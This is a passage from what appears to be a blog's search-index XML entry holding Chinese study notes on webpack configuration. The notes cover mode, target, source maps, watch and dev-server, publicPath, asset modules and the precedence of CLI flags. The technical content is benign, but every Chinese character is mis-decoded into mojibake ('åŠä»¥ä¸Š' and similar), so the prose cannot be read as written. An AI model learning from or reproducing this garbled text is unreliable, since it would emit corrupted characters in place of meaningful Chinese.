v12.xåŠä»¥ä¸Šç‰ˆæœ¬æ‰å¼€å§‹æ”¯æŒåŸç”ŸES6æ¨¡å—ï¼ˆ.mjsï¼‰,v14.xåŠä»¥ä¸Šç‰ˆæœ¬æ‰ç¨³å®šæ”¯æŒES6</li><li>webpackåŸç”Ÿæ”¯æŒES6æ¨¡å—æ˜¯æŒ‡æ”¯æŒé¡¹ç›®ä»£ç ä¸­çš„import&#x2F;exportè¯­å¥ï¼Œä½†ä»…é™äºæ¨¡å—åŒ–ä¾èµ–åˆ†æï¼Œä¸åŒ…å«è¯­æ³•è½¬æ¢ã€‚Webpack ä¼šå°† import&#x2F;export è½¬æ¢ä¸ºè‡ªå·±çš„æ¨¡å—ç³»ç»Ÿï¼ˆå¦‚__webpack_require__ï¼‰ï¼Œå®ç°ä»£ç æ‹†åˆ†å’Œä¾èµ–ç®¡ç†ã€‚</li></ul><h2 id="é›¶ç¢çŸ¥è¯†"><a href="#é›¶ç¢çŸ¥è¯†" class="headerlink" title="é›¶ç¢çŸ¥è¯†"></a>é›¶ç¢çŸ¥è¯†</h2><ul><li>webpacké€šè¿‡modeé…ç½®é¡¹è®¾ç½®æ¨¡å¼ï¼Œmodeå–å€¼èŒƒå›´ï¼šstring &#x3D; â€˜productionâ€™: â€˜noneâ€™ | â€˜developmentâ€™ | â€˜productionâ€™</li><li>webpacké€šè¿‡targeté…ç½®é¡¹è®¾ç½®æ„å»ºç›®æ ‡ï¼Œé»˜è®¤å€¼ä¸º â€œbrowserslistâ€ï¼Œtarget: string | [string] | falseï¼Œå¤štargeté€šè¿‡å¤šä¸ªç‹¬ç«‹çš„é…ç½®æ¥å®ç°ï¼šmodule.exports &#x3D; [serverConfig, clientConfig]</li><li>å¼€å‘ç¯å¢ƒé€šè¿‡source-mapè·Ÿè¸ªå †æ ˆä¿¡æ¯ï¼ˆ<code>devtool: &#39;inline-source-map&#39;</code>ï¼‰ï¼Œç”Ÿäº§ç¯å¢ƒä¸å»ºè®®ä½¿ç”¨source-map</li><li>webpack æä¾›äº†å‡ ç§å¯é€‰æ–¹å¼å¸®åŠ©åœ¨ä»£ç å‘ç”Ÿå˜åŒ–åè‡ªåŠ¨ç¼–è¯‘ä»£ç ï¼šâ€“watchã€webpack-dev-serverã€webpack-dev-middlewareï¼Œwatchæ¨¡å¼éœ€è¦æ‰‹åŠ¨åˆ·æ–°æµè§ˆå™¨ï¼Œmiddlewareæ˜¯serverçš„å†…éƒ¨å®ç°æ ¸å¿ƒï¼Œmiddleware+express -&gt; server</li><li>publicPath é…ç½®é€‰é¡¹åœ¨å„ç§åœºæ™¯ä¸­éƒ½éå¸¸æœ‰ç”¨ã€‚å¯ä»¥é€šè¿‡å®ƒæ¥æŒ‡å®šåº”ç”¨ç¨‹åºä¸­æ‰€æœ‰èµ„æºçš„åŸºç¡€è·¯å¾„</li><li>webpack5.xç‰ˆæœ¬æ–°å¢äº†èµ„æºæ¨¡å—ï¼Œå¯ä»¥ä¸å†éœ€è¦åƒä¹‹å‰çš„ç‰ˆæœ¬é…ç½®å„ç§loaderæ¥è½¬æ¢é™æ€èµ„æºï¼ˆå›¾ç‰‡ã€å­—ä½“ç­‰ï¼‰</li><li>å‘½ä»¤è¡Œæ¥å£å‚æ•°çš„ä¼˜å…ˆçº§é«˜äºé…ç½®æ–‡ä»¶ä¸­çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š<code>build: webpack --mode=&quot;production&quot;</code>ä¼šä¼˜äºwebpack.config.jsä¸­çš„<code>mode: development</code></li><li>å¯ä»¥ç»“åˆmainfestå’Œstats dataåˆ†ææ•°æ®ï¼Œä¼˜åŒ–æ„å»ºæ€§èƒ½ï¼Œmainfestå­˜åœ¨äºè¿è¡Œæ—¶ï¼ˆæµè§ˆå™¨ç¯å¢ƒï¼‰ï¼Œstats dataå­˜åœ¨äºæ„å»ºåï¼ˆæœ¬åœ°jsonï¼Œä¸å½±å“è¿è¡Œæ—¶ï¼‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>Webpack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
